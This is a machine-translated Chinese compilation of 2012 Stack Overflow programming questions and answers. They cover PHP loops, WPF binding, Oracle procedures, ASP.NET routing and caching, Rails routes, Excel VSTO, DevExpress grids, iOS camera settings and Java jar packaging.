我一直在研究一个调查系统，它从数据库中读取记录（按“章节”排序的问题，你稍后会看到我的意思）并为每条记录添加分数。问题存储在一个数组中。所以一个记录可以保存例如五个问题。让我们深入研究代码

```
//echo the question list from the database

$query_questions = mysql_query("SELECT * FROM `vraag`");
while($result = mysql_fetch_array($query_questions))
{
//displaying the questions
echo "<br /><br /><b>";
echo $result['header']. "</b><br />";
echo $result['beschrijving']. "<br /><br />";
echo $result['onderwerp']. "<br />";

$aantal = $result['aantal_vragen'];
$id = $result['id'];
echo "<input type='hidden' id='number_of_questions' value=".$aantal." mousedown='calculate_score(this.value,0)'/>";
$array = unserialize($result['vraag']);
//retrieve the content from the array
for($i = 0; $i < $array; $i++)
{
        foreach($array as $value)
        {
            $array = $value;
            echo "<form><table><td>". $array ."</td>";
            echo "
            <td>1<input type='radio' name='vraag[]' value=1 onclick='calculate_score(".$aantal.",this.value)'/></td>
            <td>2<input type='radio' name='vraag[]' value=2 onclick='calculate_score(".$aantal.",this.value)'/></td>
            <td>3<input type='radio' name='vraag[]' value=3 onclick='calculate_score(".$aantal.",this.value)'/></td>
            <td>4<input type='radio' name='vraag[]' value=4 onclick='calculate_score(".$aantal.",this.value)'/></td>
            <td>5<input type='radio' name='vraag[]' value=5 onclick='calculate_score(".$aantal.",this.value)'/></td></table></form>";
        }
    echo "Uw totaal score is: <span id='total_score[]' ></span>";
    break;
}
} 
```

问题是它使用查询的最后一条记录作为计算值，它忽略了第一条记录和第二条记录，只选择最后一条（第三条）记录我希望它为每条记录分配一个分数，所以很快得出出去。单选元素的要点是做一个从1到5的积分系统排名所以看起来像：问题1-2-3-4-5这是我的意图[记录1]得分

【记录2】得分

【记录3】得分

但目前它是这样工作的 [记录 1]

[记录2]

【记录3】得分

我不完全确定我拥有的 break 命令，但我正在测试它是否能解决我的问题。对于分数标签的事情，我知道我应该在每次填充数组时将数组增加一，但我不知道语法，或者是否有可能这样做。我是堆栈溢出的新手，所以请原谅我缺少任何标签或任何其他不可读或不愉快的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:57:47.577

外`for`循环没有意义。在内部循环中，您在迭代它时重新分配`$array`（真的不知道它做了什么，但这完全是错误的）。

```
//Drop this code:
//for($i = 0; $i < $array; $i++)
//{
    foreach($array as $value)
    {
        $array = $value;   /* this is WRONG */
        /* ... */
    }
echo "Uw totaal score is: <span id='total_score[]' ></span>";
//break;   <--- don't need this either
//} 
```

# wpf - WPF MVVM：无法从主视图绑定子视图控件属性

> ID：10347481
> 
> 赞同：0
> 
> 时间：2012-04-27T08:41:03.330
> 
> 标签：wpf, mvvm

这里我有一个名为“ChildView”的 UserControl，它有一个名为“listView”的 ListView 控件。我正在尝试将此 listView 的“SelectedItems”属性绑定为我的主窗口中的命令参数，但没有发生。执行函数参数始终为空。

下面是代码片段。

```
ChildView 

<UserControl x:Class="MyProj.Views.ChildView"
…………..
    <ListView x:Name="listView" …………..

MainView

…………..
<views:ChildView   x:Name="childView" />
…………..
<Button Command="{Binding ElementName=childView, Path=DataContext.CmdCopyLines}" CommandParameter="{Binding ElementName=childView, Path=DataContext.listView.SelectedItems}" Label="Copy" />
………….. 
```

但它是直接从子视图发生的

```
ChildView 

<UserControl x:Class="MyProj.Views.ChildView"
…………..
    <ListView x:Name="listView" 
…………..
<Button Command="{Binding CmdCopyLines}" CommandParameter="{Binding ElementName=listView, Path=SelectedItems}" Label="Copy" />
………….. 
```

任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:51:02.537

Path=DataContext.listView.SelectedItems 在您的情况下不正确，因为您的 datacontext 是您的 childviewmodel

将属性添加到您的 childviewmodel 并将其绑定到您的 selectedItems，然后您可以执行以下操作：

```
<Button Command="{Binding ElementName=childView, Path=DataContext.CmdCopyLines}"
        CommandParameter="{Binding ElementName=childView, Path=DataContext.MySelectedItems}" Label="Copy" /> 
```

# oracle - 将带有select和insert语句的sql代码转换为过程

> ID：10347486
> 
> 赞同：0
> 
> 时间：2012-04-27T08:41:28.493
> 
> 标签：oracle, stored-procedures, plsql, package

有人可以帮我将以下sql代码转换为程序吗？我已经阅读了一些 www 来源并得出结论（可能是）它应该是包装？

```
TRUNCATE TABLE MY_SCHEME.MAYA;

INSERT INTO MY_SCHEME.MAYA (ID_TEST,
                                  IQ,
                                  DATE_,
                                  COMMENT1)
   SELECT   ID_TEST,
            IQ,
            DATE_,
            COMMENT1
     FROM   MY_SCHEME.STAGE_MAYA
     where STAGE_MAYA.ID_TEST=(select max (ID_TEST) from MY_SCHEME.STAGE_MAYA) 
```

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T12:46:09.487

您可以根据您的最终要求使用 a`PROCEDURE`或 a 。`FUNCTION`

一个过程可以完成工作，但您必须随后查询`MAYA`表以查看您插入了多少条记录。

IE

```
CREATE OR REPLACE
PROCEDURE maya_insert
IS
BEGIN
   -- Truncate the maya table
   EXECUTE IMMEDIATE 'TRUNCATE TABLE MY_SCHEME.MAYA';
   --
   -- Insert records into maya
   INSERT INTO MY_SCHEME.MAYA 
   (
    ID_TEST,
    IQ,
    DATE_,
    COMMENT1
   )
   SELECT ID_TEST,
          IQ,
          DATE_,
          COMMENT1
     FROM MY_SCHEME.STAGE_MAYA
    WHERE STAGE_MAYA.ID_TEST = (SELECT MAX(ID_TEST)
                                  FROM MY_SCHEME.STAGE_MAYA);
EXCEPTION
   WHEN others
   THEN
      DBMS_OUTPUT.put_line('MAYA_INSERT error: '||sqlerrm);
END maya_insert; 
```

`COMMIT;`除非您在此过程之外提交事务，否则您可能也希望将 a放在那里，如果您确实添加了`COMMIT;`then 也在`ROLLBACK;`异常部分添加 a。请注意，尽管该`TRUNCATE`语句不能回滚，因为它是`DDL`. 如果您需要能够回滚它，那么您将不得不使用较慢的`DELETE`命令，即`DML`.

如果您需要知道插入了多少条记录，请`MAYA`使用一个函数：

IE

```
CREATE OR REPLACE
FUNCTION maya_insert
   RETURN NUMBER
IS
BEGIN
   -- Truncate the maya table
   EXECUTE IMMEDIATE 'TRUNCATE TABLE MY_SCHEME.MAYA';
   --
   -- Insert records into maya
   INSERT INTO MY_SCHEME.MAYA 
   (
    ID_TEST,
    IQ,
    DATE_,
    COMMENT1
   )
   SELECT ID_TEST,
          IQ,
          DATE_,
          COMMENT1
     FROM MY_SCHEME.STAGE_MAYA
    WHERE STAGE_MAYA.ID_TEST = (SELECT MAX(ID_TEST)
                                  FROM MY_SCHEME.STAGE_MAYA);

   -- Return the number of records inserted
   RETURN SQL%ROWCOUNT;
EXCEPTION
   WHEN others
   THEN
      DBMS_OUTPUT.put_line('MAYA_INSERT error: '||sqlerrm);
      RETURN -1;
END maya_insert; 
```

在这里，您将获得插入的记录数，如果有错误，您将被`-1`退回。如果您需要，请参阅上面的评论`COMMIT;`并`ROLLBACK;`添加。

至于包。包用于在数据库中将逻辑相关的功能过程和其他处理组合在一起。由于您只有一个过程或功能，因此在此阶段无需将其包装在一个包中。请参阅：[http ://docs.oracle.com/cd/B10501_01/appdev.920/a96624/09_packs.htm#362](http://docs.oracle.com/cd/B10501_01/appdev.920/a96624/09_packs.htm#362)

希望能帮助到你...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:53:47.983

一个包可以包含多个过程、函数、变量和定义。您对包而不是它包含的功能授予授权。一个主要的区别是，当包中的函数代码需要改变时，可以替换包体（创建或替换语法），这样不会导致依赖代码失效。对包外函数的更改总是会导致相关代码失效。

在您的情况下，您需要一个程序

# asp.net - HttpCachePolicy SetETag

> ID：10347488
> 
> 赞同：0
> 
> 时间：2012-04-27T08:41:49.757
> 
> 标签：asp.net, .net, asp.net-mvc-3, outputcache

[http://msdn.microsoft.com/en-us/library/system.web.httpcachepolicy.setetag.aspx](http://msdn.microsoft.com/en-us/library/system.web.httpcachepolicy.setetag.aspx)

有没有办法检查 ETag 是否已经设置？我不断收到异常

ETag 标头已设置

但我可以弄清楚如何检查它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T13:03:15.090

您可以检查它的响应标头。例如在 ActionResult

```
 public override void ExecuteResult(ControllerContext context)
    {
        if (_etag != null && context.HttpContext.Response.Headers["ETag"] == null)
        {
            context.HttpContext.Response.AddHeader("ETag", _etag);
        }
    } 
```

# asp.net-mvc - 如何在 MVC 4 上导航到 RESTful 站点上的帖子

> ID：10347491
> 
> 赞同：1
> 
> 时间：2012-04-27T08:41:56.220
> 
> 标签：asp.net-mvc

我正在尝试在 MVC 4 上使用 RESTful 来给我一个可以在 WP/Android/Iphone 上使用的 API，所以对于初学者来说（这个方法稍后会重新制作，这只是为了测试目的）

我有一个 WP 应用程序，它与服务器通信并向它发送一个 json 对象并使用 restclient 接收一个 json 对象

```
 RestClient client = new RestClient();
        client.BaseUrl = "http://*****.***/API/Account/Login";

        RestRequest request = new RestRequest();
        request.Method = Method.POST;
        request.RequestFormat = DataFormat.Json;

        User user = new User
        {
            UserName = "muhcow",
            Password = "123456"
        };

        request.AddBody(user);

        client.ExecuteAsync(request, response => {
            System.Diagnostics.Debug.WriteLine("jo");
        }); 
```

然后我有我的服务器代码，我首先尝试制作一个普通的控制器，然后只制作一个名为 account 的控制器和一个名为 login 的操作，并使用 httppost，这工作得很好，但从我可以读到的不是休息的方式！

所以我尝试制作一个从 apicontroller 继承的控制器，但现在我遇到了问题，甚至被路由到 LoginController 中的 Post 操作

所以帖子在 Domain\API\Login\LoginController

而post动作是这样的

```
 public string Post(Login loginModel)
    {
        LoginResponse loginResponse = new LoginResponse();
        if (Membership.ValidateUser(loginModel.UserName, loginModel.Password))
        {
            loginResponse.Success = true;
            loginResponse.Token = "11111111111111111";

            return Json.Encode(loginResponse);
        }

        loginResponse.Success = false;
        loginResponse.Error = 1;
        return Json.Encode(loginResponse);
    } 
```

但使用未命中的当前代码（使用断点检查）

我还没有改变 MapRoute 所以它只是

```
 public override void RegisterArea(AreaRegistrationContext context)
    {
        context.MapRoute(
            "API_default",
            "API/{controller}/{action}/{id}",
            new { action = "Index", id = UrlParameter.Optional }
        );
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T22:59:14.860

简短的回答是，您需要使用[RouteCollectionExtensions](http://msdn.microsoft.com/en-us/library/system.web.http.routecollectionextensions.maphttproute%28v=vs.108%29.aspx)`ApiController`设置一个特定的路线，如下所示（而不是您拥有的路线）：

```
context.Routes.MapHttpRoute(
   name: "API_default",
   routeTemplate: "API/{controller}/{action}/{id}",
   defaults: new { action = "Index", id = RouteParameter.Optional}
); 
```

只是对“不是做 REST 的方式”评论的快速说明 - 这实际上是一个非常热门的话题。我不会太担心你的[RESTful](http://en.wikipedia.org/wiki/Representational_state_transfer)程度。考虑 RESTful 架构有助于解决什么问题，看看它是否与您正在解决的问题相匹配（以及您希望在何种程度上采用这些原则）。

那里有很多很棒的文献，但我发现Martin Fowler 的[这篇文章对理解它特别有帮助。](http://martinfowler.com/articles/richardsonMaturityModel.html)

# html - Rails 根据参数执行操作

> ID：10347494
> 
> 赞同：0
> 
> 时间：2012-04-27T08:42:00.210
> 
> 标签：html, ruby-on-rails, ruby

我正在用rails进行一个小搜索。搜索应该像 /search?q="[query]"

有没有办法将没有“？q =”参数的请求路由到索引操作，否则路由到搜索操作？我已经尝试过了，但它不起作用。

```
 controller :search do
    get ':index' => :index
    get ':index?:query' => :search
  end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:08:24.603

在您的操作中添加

```
redirect_to root_path and return unless params[:q] 
```

# c# - 使用 C# VSTO 的 Excel 程序

> ID：10347495
> 
> 赞同：1
> 
> 时间：2012-04-27T08:42:01.423
> 
> 标签：c#, excel, vsto

我创建了 C# Excel Addin 项目，在该项目中，我向该 excel 添加了一个 User 控件，并在 User Control 中放置了一个按钮。对于按钮，我为将数据从数据库获取到 Excel 单元格（sheet1）而编写的代码。但是这里遇到的问题是，当我单击按钮时，会打开一个新的 Excel 工作表（应用程序），并将数据从数据库填充到新的 Excel 工作表中。但我只想将我的数据从数据库填充到现有的 excel 工作表，而不是新的 excel 工作表。你能帮帮我吗？

我应该只在同一个 excel 中获取数据，而不是为新的 excel 表获取数据。下面是我的代码：-

```
worksheet = workbook.Sheets["Sheet1"];
worksheet = workbook.ActiveSheet;
app.Visible = true;---- **here i am getting new excel application  and data is getting populated**
worksheet.Name = "Export to Excel";
Excel.Range mycell = Excel.Range)worksheet.get_Range("A1:B1","A1:B1");

int CountColumn = ds.Tables[0].Columns.Count;
int CountRow = ds.Tables[0].Rows.Count;
int col = 0;
int row = 1;
string data = null;
int i = 0;
int j = 0;
for (col = 0; col < CountColumn; col++)
{
    worksheet.Cells[row, col + 1] = ds.Tables[0].Columns[col].ColumnName.ToString();
}

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-28T06:08:20.287

不知道为什么你在这里使用 Excel 应用程序对象，即应用程序，而不是在插件项目中，你必须使用 Globals.ThisAddin.Application.ActiveSheet/ Globals.ThisAddin.Application.ActiveWorkBook 来获取活动工作表/工作簿。如果您在 wpf 项目中无权访问 Globals，则可以在 post [Get the excel cell address from a UDF](https://stackoverflow.com/questions/8708030/get-the-excel-cell-address-from-a-udf/8708200#8708200)中找到正确的获取方法，看看这是否有帮助

```
 var worksheet = Globals.ThisAddin.Application.ActiveSheet
        worksheet.Name = "Export to Excel"; 
        Excel.Range mycell = (Excel.Range)worksheet.get_Range("A1:B1","A1:B1");  
        int CountColumn = ds.Tables[0].Columns.Count; 
        int CountRow = ds.Tables[0].Rows.Count; 
        int col = 0; 
        int row = 1; 
        string data = null; 
        int i = 0; 
        int j = 0; 
        for (col = 0; col < CountColumn; col++) 
        { 
            worksheet.Cells[row, col + 1] = ds.Tables[0].Columns[col].ColumnName.ToString(); 
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-28T16:34:24.977

根据定义，当您使用 Excel 加载项时，Excel 已经打开，因此尝试启动新实例是没有意义的。正如 Brijesh 所提到的，Excel 加载项使您可以使用 Globals.ThisAddin.Application 访问当前 Excel 实例，然后您可以从那里访问整个对象模型。

顺便说一句，您似乎正在通过逐个单元格地迭代将数据写入工作表。如果您有大量数据，这是一个坏主意，您应该能够一次编写它。

# ios - 如何在 iOS for Unity 中重新启动单模块？

> ID：10347500
> 
> 赞同：1
> 
> 时间：2012-04-27T08:42:11.140
> 
> 标签：ios, mono, unity3d

我想在 iPhone 上重新启动引擎 Unity。为此，我们已经适应了`AppController`. 我们使用该`Unitycleanup`函数退出 Unity。但是如果我们`Unity InitApplication`再次启动该函数，那么应用程序就会崩溃。我们现在注意到该`RegisterAllStrippedInternalCalls`函数存在问题。因此，如何禁用单模块的问题？

# c# - 带有 checkBoxEdit 列的 DevExpress XtraGrid 控件

> ID：10347505
> 
> 赞同：1
> 
> 时间：2012-04-27T08:42:44.327
> 
> 标签：c#, winforms, devexpress, xtragrid

我有一个 DevExpress [XtraGrid](http://devexpress.com/Products/NET/Controls/WinForms/Grid/)控件，它包含三列和一个未绑定的 checkBoxEdit 列，供用户在从网格中删除项目时进行选择。我可以在 xtraGrid 上添加 checkBoxEdit。但是，我不知道如何删除所选列表的主键。任何想法都受到高度赞赏。谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T15:53:18.667

我相信您可以使用以下方法：

```
void InitGrid() {
    gridControl1.DataSource = new List<Person> { 
        new Person(){ ID = 0 }, 
        new Person(){ ID = 1 }, 
        new Person(){ ID = 2 }
    };
    gridView.Columns["ID"].Visible = false;
    gridView.Columns.Add(new DevExpress.XtraGrid.Columns.GridColumn()
    {
        UnboundType = DevExpress.Data.UnboundColumnType.Boolean,
        Caption = "Mark as Deleted",
        FieldName = "IsDeleted",
        Visible = true,
    });
}
IDictionary<int, object> selectedRows = new Dictionary<int, object>();
void gridView1_CustomUnboundColumnData(object sender, CustomColumnDataEventArgs e) {
    int id = (int)gridView.GetListSourceRowCellValue(e.ListSourceRowIndex, gridView.Columns["ID"]);
    if(e.IsGetData) 
        e.Value = selectedRows.ContainsKey(id);
    else {
        if(!(bool)e.Value)
            selectedRows.Remove(id);
        else selectedRows.Add(id, e.Row);
    }
}
void OnDelete(object sender, System.EventArgs e) {
    //... Here you can iterate thought selectedRows dictionary
}
//
class Person {
    public int ID { get; set; }
    public string Name { get; set; }
    public string Age { get; set; }
} 
```

相关帮助主题：

*   [ColumnView.CustomUnboundColumnData 事件](http://documentation.devexpress.com/#WindowsForms/DevExpressXtraGridViewsBaseColumnView_CustomUnboundColumnDatatopic)
*   [ColumnView.GetListSourceRowCellValue 方法](http://documentation.devexpress.com/#WindowsForms/DevExpressXtraGridViewsBaseColumnView_GetListSourceRowCellValuetopic946)

# vb.net - 没有图像的渐变背景

> ID：10347507
> 
> 赞同：0
> 
> 时间：2012-04-27T08:42:55.820
> 
> 标签：vb.net, winforms

如何在不使用任何图像的情况下为我的表单和文本创建渐变背景以及如何在 VB.NET 中在相同的表单背景中添加多个图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-07T07:09:33.200

我在这篇文章中找到了答案

[http://www.getdotnetcode.com/nexDotNet/030005H2GradientBg4WinFormVB/H2GradientBg4WinFormVB.htm](http://www.getdotnetcode.com/nexDotNet/030005H2GradientBg4WinFormVB/H2GradientBg4WinFormVB.htm)

谢谢你。

# google-docs-api - 更改提要中的 Google 文档提要 ID/资源 ID 不同

> ID：10347508
> 
> 赞同：1
> 
> 时间：2012-04-27T08:42:59.490
> 
> 标签：google-docs-api, google-drive-api

当使用 Google Drive / docs feed 来获取项目时，条目会返回一个 id 和资源 id，结构如下：

```
<id>https://docs.google.com/feeds/id/document%3A12345</id>
<gd:resourceId>document:12345</gd:resourceId> 
```

我们使用 Google 提要已经有一段时间了，我们使用资源 ID 作为文档的唯一键，以便在系统中返回它。然而，随着新的更改提要取回已删除的项目，谷歌似乎总是返回一个资源 id：

```
<id>https://docs.google.com/feeds/id/unknown%312345</id>
<gd:resourceId>unknown:12345</gd:resourceId> 
```

显然，这会导致 ID 匹配失败。谷歌是否建议我们忽略他们的资源 ID 并自己将其解析为真实 ID？

您会在更改提要中为开发人员提供一个 ID 以引用某个项目，这似乎很愚蠢，但在删除该项目后，他们会为我们提供一个完全不同的 ID。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-29T14:08:37.517

对于它的价值，我们总是`unknown:[resource_id]`在更改提要中返回以表示已删除的资源，如此[处](https://developers.google.com/google-apps/documents-list/#changes_representing_a_deletion)所述。

我在这里的建议是您拆分`:`字符，并比较未[键入的资源 ID](https://developers.google.com/google-apps/documents-list/#terminology_used_in_this_guide)。

# asp.net - 这个 Global.asax 路由设置有什么问题？

> ID：10347512
> 
> 赞同：6
> 
> 时间：2012-04-27T08:43:02.237
> 
> 标签：asp.net, url-routing, asp.net-routing

我可能对 ASP.NET 期望过高，但在 Apache 中，重写 url 很简单，因此请求类似： [http://mysite/myfolder/mypage/niceurlparameter](http://mysite/myfolder/mypage/niceurlparameter) 实际上设法提供静态页面[http://mysite/mypage.html](http://mysite/mypage.html)

我如何在 Global.asax 中做到这一点？

我试过这个：

```
RouteTable.Routes.MapPageRoute("Static HTML", "myfolder/{page}/*", "~/myfolder/{page}.html"); 
```

但是当我请求[http://mysite/myfolder/mypage/niceurlparameter](http://mysite/myfolder/mypage/niceurlparameter)时，它一直返回 404 。

但是，这有效：

```
RouteTable.Routes.MapPageRoute("Static HTML", "myfolder/{page}.html/*", "~/myfolder/{page}.html"); 
```

所以我在请求[http://mysite/myfolder/mypage.html/niceurlparameter 时确实得到了 mypage.html](http://mysite/myfolder/mypage.html/niceurlparameter)。

我只想摆脱我的网址中的“.html”部分。我错过了什么？

更新：由于某种原因，在前一种情况下，“*”通配符未被接受。

更改为：

```
RouteTable.Routes.MapPageRoute("Static HTML", "myfolder/{page}/{whatever}", "~/myfolder/{page}.html"); 
```

似乎将请求路由到 html 页面，但随后出现错误：

```
There is no build provider registered for the extension '.html'. 
```

为什么在世界上它只能在前一种情况下工作（在 URL 中使用 html），而不是在 html 被忽略时？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T11:30:11.763

> 没有为扩展“.html”注册构建提供程序

您收到此错误是因为静态 html 文件应由 IIS 直接处理。但是，在您的情况下，ASP.NET MVC 框架正在尝试处理`.html`它无法处理的 type 文件。

因此，如果您认为这是您需要做的，您将必须创建一个新的提供程序并在 web.config 文件中注册。看这个

[ASP.NET 的自定义文件扩展名 - 需要帮助！](https://stackoverflow.com/questions/6004213/custom-file-extensions-for-asp-net-help-needed)

您可以简单地将静态 html 内容更改为 .aspx 文件。一个简单的复制和粘贴就可以完成这项工作，它应该可以正常工作。它将知道如何处理文件类型。

# c# - 具有在运行时创建的成员的类

> ID：10347514
> 
> 赞同：0
> 
> 时间：2012-04-27T08:43:04.783
> 
> 标签：c#, winforms, .net-2.0

我们有一个方法，它返回当前显示在网格中的行。

```
public override List<object> GetData(int startIndex, int endIndex, string[] rowSortBy, bool[] rowAscSortOrder, 
                   string[] rowGroupByOperations, string rowFilterExpression, ref int rowCount)        
    {

          List<A> list =  new List<A>();
          .. logic..

          return list;        
    } 
```

问题是现在网格列是**动态**的，它们会根据某些条件不断变化。这意味着我们不能使用类型化类，因为数据成员是动态的。另外，我们不能更改方法的返回类型，`List<object>`因为`GetData`这实际上是由第三方控件使用的。

**编辑**：我们需要在网格上进行更新。

我能想到的唯一方法是使用反射来上课。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T11:02:35.477

听起来您需要在列表中的对象上实现 ICustomTypeDescriptor。

通过这种方式请求属性，您可以在运行时返回具有新属性的相关数据。

[http://wraithnath.blogspot.co.uk/2011/01/implementing-icustomtypedescriptor-for.html](http://wraithnath.blogspot.co.uk/2011/01/implementing-icustomtypedescriptor-for.html)

[http://msdn.microsoft.com/en-us/magazine/cc163816.aspx](http://msdn.microsoft.com/en-us/magazine/cc163816.aspx)

这花了我一段时间才弄清楚第一次，因为它有点复杂。但是它确实有效！

# iphone - 更改 ISO 或快门速度

> ID：10347515
> 
> 赞同：4
> 
> 时间：2012-04-27T08:43:05.217
> 
> 标签：iphone, performance, camera

我正在尝试控制 iPhone 的 ISO 和快门速度，但它在 AVFoundation 中没有 API。它只能改变曝光，wb for iphone。

如何控制 ISO 或快门速度？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2016-04-27T11:22:29.797

我猜现在在 iOS 8 之后，现在你也可以更改快门速度和 ISO。

通过使用此功能

```
- (void)setExposureModeCustomWithDuration:(CMTime)duration ISO:(float)ISO completionHandler:(void (^)(CMTime syncTime))handler NS_AVAILABLE_IOS(8_0); 
```

[您可以在 AVCapturedevice 类中设置快门速度和 ISO 值以获得更多帮助，您可以在此处](https://developer.apple.com/library/ios/documentation/AVFoundation/Reference/AVCaptureDevice_Class/#//apple_ref/occ/instp/AVCaptureDevice/adjustingExposure)查看该类。

[讨论](https://developer.apple.com/documentation/avfoundation/avcapturedevice/1624646-setexposuremodecustom)

[在此处](https://developer.apple.com/library/ios/samplecode/AVCamManual/Introduction/Intro.html#//apple_ref/doc/uid/TP40014578)参考此应用程序以进行实施

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-01T09:25:42.167

不幸的是，您几乎无法控制 iPhone 相机。您只能锁定或解锁曝光、白平衡和对焦模式。

Camera+ 实际上无法控制您描述的任何内容。它曾经能够破解硬件，这自然是让您的应用被审阅者拒绝的好方法。

我希望 iOS6 能给开发者更大的控制权，因为它是一个 PITA。

# c# - 如何在 wpf 中使富文本框自动调整大小？

> ID：10347518
> 
> 赞同：4
> 
> 时间：2012-04-27T08:43:12.077
> 
> 标签：c#, .net, wpf, wpf-controls, richtextbox

如何使 RichTextBox 自动调整大小？我希望我的富文本框适合我分配给它的任何文本，而没有滚动条。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:54:52.703

```
 Bitmap objBmpImage = new Bitmap(1, 1);

        int intWidth = 0;
        int intHeight = 0;

        // Create the Font object for the image text drawing.
        Font objFont = new Font("Arial", 20, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Pixel);

        // Create a graphics object to measure the text's width and height.
        Graphics objGraphics = Graphics.FromImage(objBmpImage);

        // This is where the bitmap size is determined.
        intWidth = (int)objGraphics.MeasureString(sImageText, objFont).Width;
        intHeight = (int)objGraphics.MeasureString(sImageText, objFont).Height; 
```

您已经有字符串来设置文本框。首先，您可以像上面一样计算来测量richtextbox的适当大小。您可以在文本框中设置 intWidth 和 intHeight。我认为这对你很有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:57:26.560

将`HorizontalAlignment`and设置为`VerticalAlignment`除`Stretch`（这是默认设置）以外的其他值。这将使 TextBox 缩小以适合其内容。如果你然后将它粘在`StackPanel`其中`Orientation`，`Horizontal`它不会垂直滚动，而是被它的包含面板剪裁，我认为这就是你所追求的。如果您希望包含面板将自身调整为文本，那么您需要相应地配置面板

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-28T09:34:45.483

尝试使用 ViewBox

```
<Viewbox>
    <RichTextBox />
</Viewbox> 
```

# c# - OracleParameter.Size 有什么影响？

> ID：10347520
> 
> 赞同：4
> 
> 时间：2012-04-27T08:43:16.553
> 
> 标签：c#, .net, oracle, data-access-layer, odp.net

在 DAL 中开发使用 ODP .NET 的应用程序时，总是设置`Size`. `OracleParameter`例如：

```
getSPTimeCommand.Parameters.Add("pStartTime", OracleDbType.Varchar2, ParameterDirection.Output).size = 200; 
```

是不是很丑？考虑自动设置`Size`参数`OracleParameter`我认为它会影响性能或内存消耗。那是什么影响？您设置 a 的方案是`Size`什么？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:52:21.627

从[文档中](http://docs.oracle.com/cd/B19306_01/win.102/b14307/OracleParameterClass.htm#i1010881)：

> 指定传入或传出数据库的数据的最大大小（以字节或字符为单位）。对于 PL/SQL Associative Array Bind，Size 指定 PL/SQL Associative Array 中元素的最大数量。

在您的情况下，它是您传递给数据库的 varchar2 的最大大小。

# java - 如何获取安装在 android mobile 上的所有浏览器名称

> ID：10347526
> 
> 赞同：2
> 
> 时间：2012-04-27T08:43:37.047
> 
> 标签：java, android

我是android应用程序开发的新手。

我想通过应用程序获取 android mobile 上已安装浏览器名称的列表。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:51:17.107

这个我没有测试，但是最明显的方法应该是使用PackageManager来查找什么application/Activity可以解析Intent来浏览一个网址。

您正在寻找的功能是：http: [//developer.android.com/reference/android/content/pm/PackageManager.html#queryIntentActivities](http://developer.android.com/reference/android/content/pm/PackageManager.html#queryIntentActivities(android.content.Intent) (android.content.Intent , int)

Intent 应该有操作[ACTION_VIEW](http://developer.android.com/reference/android/content/Intent.html#ACTION_VIEW)并且数据可以是“http://www.google.com”或您想要的任何网址（只要它以 http 开头）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:06:33.780

根据您的问题，我推断您可能希望用户选择浏览器来打开 URL？！如果您只是希望用户选择一个已安装的浏览器来打开您的应用程序提供的 URL，您不必自己显示它们的列表。Android会关心它；看到[这个](https://stackoverflow.com/questions/3004515/android-sending-an-intent-to-browser-to-open-specific-url)

# c# - 将 doc、docx、rtf、txt、xls、xslx、pdf 转换为 Web 应用程序的 HTML/HTM 格式的 API，无需在后端使用 MS Office

> ID：10347533
> 
> 赞同：1
> 
> 时间：2012-04-27T08:44:09.683
> 
> 标签：c#, asp.net, vb.net

我需要第三方 API 将 * *doc、docx、rtf、txt、xls、xslx、pdf 转换为 HTML/HTM **格式，而无需在后端使用 MS Office 组件（MSWORD/EXCEL）。此 API 必须支持图像的相对路径，因为我将在基于 ASP.NET Web 的应用程序中使用它。

请帮帮我，钱不是问题，付费 API 也是可取的。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:00:23.183

好吧，这可能不是您要寻找的答案，但是有一个 JAVA 库可以读取 doc、docx、xls 和 xlsx 格式 (ApachePOI)，因此您可以分析文件并自己创建 HTML 输出。它确实支持相对路径 afaik。当然，它需要大量的自定义编码，而且您还必须在 C# 中包含 Java 库（尽管我记得听说过这并不难，但从未尝试过）。

希望这可以帮助

# java - 构建 jar 并包含库 jar

> ID：10347534
> 
> 赞同：1
> 
> 时间：2012-04-27T08:44:12.237
> 
> 标签：java, eclipse, jar

我正在使用 Eclipse。

我写了一个小的 Java Gui 工具，它依赖于我的 eclipse 项目中包含的 jnetpcap 库。在我的磁盘上，该库位于与项目不同的目录中。

我想构建一个 jar ( `export-> jar`) 让它在其他计算机上运行，​​但我没有找到如何“包含”该 jar 文件。

我不介意它是合并到一个文件中还是库是单独发货的。我只是不知道要配置什么以及在哪里完整构建该依赖项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:47:11.800

没有开箱即用的方法可以做到这一点，但是有一些工具可以提供 jar 依赖包含。

[我想到了Jarjar](http://code.google.com/p/jarjar/)和[one-jar](http://one-jar.sourceforge.net/)。两者都提供 ant 任务，后者有一个 maven 插件。

如果您使用的是 Eclipse，则在创建可执行 jar 时，依赖项会自动包含在 AFAIK 中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T09:00:27.857

我强烈建议您查看 Ant 或 Maven 等构建工具。它们是 Java 项目的事实上的标准，将帮助您完成这些任务。

看看这个链接：[http ://maven.apache.org/guides/getting-started/maven-in-five-minutes.html](http://maven.apache.org/guides/getting-started/maven-in-five-minutes.html)

